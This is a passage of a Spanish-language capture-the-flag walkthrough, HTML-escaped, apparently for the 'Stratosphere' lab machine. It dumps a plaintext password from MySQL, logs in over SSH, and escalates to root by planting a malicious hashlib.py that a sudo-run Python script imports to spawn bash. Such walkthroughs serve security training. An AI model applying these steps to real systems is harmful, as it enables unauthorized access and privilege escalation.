+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$~&lt;/span&gt; mysql &lt;span class=&quot;nt&quot;&gt;-uadmin&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-padmin&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;use users; show tables&quot;&lt;/span&gt;
+
+Tables_in_users
+accounts
+
+&lt;span class=&quot;nv&quot;&gt;$~&lt;/span&gt; mysql &lt;span class=&quot;nt&quot;&gt;-uadmin&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-padmin&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;use users; describe accounts&quot;&lt;/span&gt;
+
+Field   Type    Null    Key     Default Extra
+fullName        varchar&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;45&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;     YES             NULL
+password        varchar&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;30&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;     YES             NULL
+username        varchar&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;20&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;     YES             NULL
+
+&lt;span class=&quot;nv&quot;&gt;$~&lt;/span&gt; mysql &lt;span class=&quot;nt&quot;&gt;-uadmin&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-padmin&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;use users; select username,password from accounts&quot;&lt;/span&gt;
+
+username        password
+richard 9tc&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;rhKuG5TyXvUJOrE^5CK7k
+
+&lt;span class=&quot;nv&quot;&gt;$~&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos credenciales del usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;richard&lt;/code&gt; que checando el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; es un usuario válido al nivel de sistema; por lo que podríamos tratar de acceder por SSH:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ssh richard@10.10.10.64
+The authenticity of host &lt;span class=&quot;s1&quot;&gt;'10.10.10.64 (10.10.10.64)'&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;'t be established.
+ECDSA key fingerprint is SHA256:tQZo8j1TeVASPxWyDgqJf8PaDZJV/+LeeBZnjueAW/E.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '&lt;/span&gt;10.10.10.64&lt;span class=&quot;s1&quot;&gt;' (ECDSA) to the list of known hosts.
+richard@10.10.10.64'&lt;/span&gt;s password: 
+Linux stratosphere 4.9.0-6-amd64 &lt;span class=&quot;c&quot;&gt;#1 SMP Debian 4.9.82-1+deb9u2 (2018-02-21) x86_64&lt;/span&gt;
+
+The programs included with the Debian GNU/Linux system are free software&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+the exact distribution terms &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;each program are described &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the
+individual files &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /usr/share/doc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Feb 27 16:26:33 2018 from 10.10.14.2
+richard@stratosphere:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;richard
+richard@stratosphere:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya estamos dentro de la máquina y podemos visualizar la flag (user.txt). Ahora nos queda escalar privilegios, así que vamos a enumerar un poco el sistema.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;richard@stratosphere:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;richard&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;richard&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;richard&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,24&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;cdrom&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,25&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;floppy&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,29&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;audio&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,30&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dip&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,44&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;video&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,46&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;plugdev&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,108&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;netdev&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,112&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;lpadmin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,116&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+richard@stratosphere:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;richard on stratosphere:
+    env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin
+
+User richard may run the following commands on stratosphere:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/python&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; /home/richard/test.py
+richard@stratosphere:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que tenemos permisos de ejecución del programa &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.py&lt;/code&gt;, así que vamos a echarle un ojo:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hashlib&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;question&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;q1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Solve: 5af003e100c80923ec04d65933d382cb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;md5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashlib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;5af003e100c80923ec04d65933d382cb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Sorry, that's not right&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;You got it!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;q2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Now what's this one? d24f6fb449855ff42344feff18ee2819033529ff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sha1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashlib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sha1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sha1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sha1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'d24f6fb449855ff42344feff18ee2819033529ff'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Nope, that one didn't work...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;WOW, you're really good at this!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;q3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;How about this? 91ae5fc9ecbca9d346225063f23d2bd9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;md4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashlib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'md4'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;md4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;md4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'91ae5fc9ecbca9d346225063f23d2bd9'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Yeah, I don't think that's right.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;OK, OK! I get it. You know how to crack hashes...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;q4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Last one, I promise: 9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;blake&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashlib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'BLAKE2b512'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;blake&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;blake&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;You were so close! urg... sorry rules are rules.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
+
+    &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/root/success.py'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;question&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que el programa solicita las palabras asociadas a los hashes que se tienen; sin embargo, esto no nos va a funcionar para escalar privilegios. Algo que debemos tener en cuenta es que el programa está haciendo uso de la libreria &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashlib&lt;/code&gt;, por lo que vamos a echarle un ojo a las rutas:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;richard@stratosphere:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python
+Python 3.5.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default, Jan 19 2017, 14:11:04&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;GCC 6.3.0 20170118] on linux
+Type &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;copyright&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;credits&quot;&lt;/span&gt; or &lt;span class=&quot;s2&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;more information.
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; import sys
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; sys.path
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'/usr/lib/python35.zip'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'/usr/lib/python3.5'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'/usr/lib/python3.5/plat-x86_64-linux-gnu'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'/usr/lib/python3.5/lib-dynload'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'/usr/local/lib/python3.5/dist-packages'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'/usr/lib/python3/dist-packages'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que el path comienza por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;''&lt;/code&gt;, lo que indica que las librerías o cualquier otro pograma en python a utilizar será buscado primeramente por el directorio actual de trabajo; así que podríamos crear un archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashlib.py&lt;/code&gt; en la ruta donde se encuentra el programa &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.py&lt;/code&gt; y como &lt;strong&gt;root&lt;/strong&gt; ejecuta el archivo, también ejecutará nuestro archivo (libreria) y no nos solicita contraseña &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo /usr/bin/python3 /home/richard/test.py&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'whoami'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;richard@stratosphere:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 test.py 
+richard
+Solve: 5af003e100c80923ec04d65933d382cb
+^CTraceback &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;most recent call last&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+  File &lt;span class=&quot;s2&quot;&gt;&quot;test.py&quot;&lt;/span&gt;, line 38, &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;
+    question&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+  File &lt;span class=&quot;s2&quot;&gt;&quot;test.py&quot;&lt;/span&gt;, line 6, &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;question
+    q1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; input&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Solve: 5af003e100c80923ec04d65933d382cb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+KeyboardInterrupt
+richard@stratosphere:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/bin/python3 /home/richard/test.py 
+root
+Solve: 5af003e100c80923ec04d65933d382cb
+^CTraceback &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;most recent call last&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+  File &lt;span class=&quot;s2&quot;&gt;&quot;/home/richard/test.py&quot;&lt;/span&gt;, line 38, &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;
+    question&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+  File &lt;span class=&quot;s2&quot;&gt;&quot;/home/richard/test.py&quot;&lt;/span&gt;, line 6, &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;question
+    q1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; input&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Solve: 5af003e100c80923ec04d65933d382cb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+KeyboardInterrupt
+richard@stratosphere:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo /usr/bin/python3 /home/richard/test.py&lt;/code&gt; ejecutamos el programa temporalemente como &lt;strong&gt;root&lt;/strong&gt;; así que podríamos mandarnos una &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'bash'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
